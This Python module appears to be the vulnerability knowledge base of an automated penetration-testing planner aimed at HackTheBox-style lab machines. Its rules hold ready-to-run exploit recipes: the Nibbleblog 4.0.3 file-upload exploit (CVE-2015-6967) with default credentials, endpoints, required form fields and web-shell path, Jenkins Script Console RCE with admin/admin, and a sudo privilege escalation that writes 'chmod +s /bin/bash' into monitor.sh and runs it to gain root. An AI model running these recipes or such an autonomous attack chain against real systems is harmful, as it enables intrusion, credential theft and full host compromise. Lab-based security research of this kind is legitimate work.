"""
KB = Knowledge Based

Generic vulnerability knowledge base.

We currently have per-scenario JSONs which declares the world (hosts, services, paths, loot)
but it does not declare which vulns exist. That knowledge will be living here.
It'll be applied at run time against the observed state. This is what lets the planner reason about
unknown infrastructure (HackTheBox) where we can't spoil the answer in
the scenario file.

A KB rule produces a vuln dict in the same shape `transition.py` and
`action_generator.py` already consume from declared scenarios, so existing
gating logic (e.g. `VF-UPLOAD-001` triggers EXPLOIT_UPLOAD) keeps working.
"""

from typing import Callable

from core.state import State

# Each rule: (id, name, severity, cost, requires, gives, predicate)
# `predicate(host, state) -> bool` decides if the rule fires given current observations
RULES: list[dict] = [
    {
        "id": "VF-UPLOAD-001",
        "name": "Nibbleblog 4.0.3 authenticated arbitrary file upload (CVE-2015-6967)",
        "service": "http",
        "severity": "high",
        "cost": 3,
        "requires": ["/admin", "credential:admin"],
        "gives": ["web_shell", "file_access"],
        # match as soon as the app is recognized (path signal)
        # cred requirement is enforced separately via `requires` 
        # so try_default_creds can fetch its recipe before any creds exist
        "predicate": lambda host, state: _path_contains(
            state, host["id"], "nibbleblog"
        ),
        # exploit recipe - consumed by real executors when this vuln matches
        "default_credentials": ("admin", "nibbles"),
        "login_endpoint": "/nibbleblog/admin.php",
        "login_payload_keys": ("username", "password"),
        "login_success_indicator": "logout",  # substring expected in response on success
        "upload_endpoint": "/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image",
        "upload_field_name": "image",
        # the my_image plugin form has 7 sibling fields besides the file
        # without them the plugin handler bails silently (POST returns 200 file never lands)
        "upload_extra_fields": {
            "plugin": "my_image",
            "title": "My image",
            "caption": "",
            "image_resize": "1",
            "image_width": "230",
            "image_height": "200",
            "image_option": "auto",
        },
        "shell_path_after_upload": "/nibbleblog/content/private/plugins/my_image/image.php",
        "loot_files": ["/var/www/html/nibbleblog/content/private/users.xml"],
    },
    {
        "id": "VF-JENKINS-001",
        "name": "Jenkins Script Console RCE (default credentials)",
        "service": "http",
        "severity": "high",
        "cost": 4,
        "requires": ["/script"],
        "gives": ["web_shell", "file_access"],
        "predicate": lambda host, state: (
            _path_contains(state, host["id"], "/script")
            and _service_banner_contains(state, host["id"], "jenkins")
        ),
        "default_credentials": ("admin", "admin"),
        "groovy_endpoint": "/script",
        "loot_files": [],
    },
    {
        "id": "VF-PRIVESC-001",
        "name": "sudo NOPASSWD on writable script (Nibbles monitor.sh)",
        "service": "shell",
        "severity": "critical",
        "cost": 5,
        "requires": ["access:web_shell"],
        "gives": ["root", "compromise"],
        "predicate": lambda host, state: state.access_levels.get(host["id"]) == "web_shell",
        "enum_command": "sudo -l",
        "enum_indicator": r"NOPASSWD.*monitor\.sh",
        "setup_command": "cd /home/nibbler && unzip -o personal.zip 2>/dev/null; mkdir -p /home/nibbler/personal/stuff",
        "payload_path": "/home/nibbler/personal/stuff/monitor.sh",
        "payload_content": "#!/bin/bash\nchmod +s /bin/bash\n",
        "trigger_command": "sudo /home/nibbler/personal/stuff/monitor.sh",
        "verify_command": "/bin/bash -p -c 'id'",
        "verify_indicator": r"uid=0",
    },
]


def _path_contains(state: State, host_id: str, fragment: str) -> bool:
    return any(fragment in p for p in state.discovered_paths.get(host_id, set()))


def _service_banner_contains(state: State, host_id: str, fragment: str) -> bool:
    services = state.discovered_services.get(host_id, {})
    return any(fragment.lower() in str(name).lower() for name in services.values())


def _strip_predicate(rule: dict) -> dict:
    return {k: v for k, v in rule.items() if k != "predicate"}


def match_kb(host: dict, state: State) -> list[dict]:
    """
    Return KB rules whose predicates fire against current observations
    """
    return [_strip_predicate(rule) for rule in RULES if rule["predicate"](host, state)]


def vuln_reqs_met(
    vuln: dict, paths: set, state: State, *, host_id: str | None = None
) -> bool:
    """
    heck vuln 'requires' list against observed paths and creds

    Path requirements use substring matching so a generic hint like "/admin"
    matches deeper real paths like "/nibbleblog/admin.php".
    """
    for req in vuln.get("requires", []):
        if req.startswith("credential:"):
            user = req.split(":", 1)[1]
            if not any(c.username == user for c in state.creds_found):
                return False
        elif req.startswith("access:"):
            # access: web_shell means "vuln only fires if we already own this host at this level"
            level = req.split(":", 1)[1]
            if host_id is None or state.access_levels.get(host_id) != level:
                return False
        else:
            if not any(req in path for path in paths):
                return False
    return True


def vulns_for(host: dict, state: State) -> list[dict]:
    """Union of scenario-declared vulns and KB-matched vulns, deduped by id.

    Declared vulns win on conflict — scenarios can override KB defaults if
    they want to pin a specific cost or requirement set.
    """
    declared = list(host.get("vulnerabilities", []))
    declared_ids = {v["id"] for v in declared}
    matched = [v for v in match_kb(host, state) if v["id"] not in declared_ids]
    return declared + matched


def recipe_for(host: dict, state: State, capability: str) -> dict | None:
    """
    Return the first matched vuln on this host whose `gives` includes capability

    Real executors call this to fetch app specific exploit data 
    like (login URLs, upload endpoints, default creds, loot file paths)
    
    Returns None if no matched vuln offers the capability
    The caller should treat that as a recipe
    miss and fail with error='recipe_missing'
    """
    for vuln in vulns_for(host, state):
        if capability in vuln.get("gives", []):
            return vuln
    return None